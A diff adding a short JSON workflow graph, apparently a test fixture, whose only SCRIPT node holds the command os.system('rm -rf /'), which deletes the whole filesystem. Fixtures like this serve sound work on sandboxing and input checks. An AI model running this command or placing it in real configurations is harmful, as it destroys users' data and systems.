@@ -1,0 +1,12 @@
+{
+  "graph": {
+    "startNode": "a",
+    "nodes": [
+      {
+        "id": "a",
+        "kind": "SCRIPT",
+        "code": "os.system('rm -rf /')"
+      }
+    ]
+  }
+}
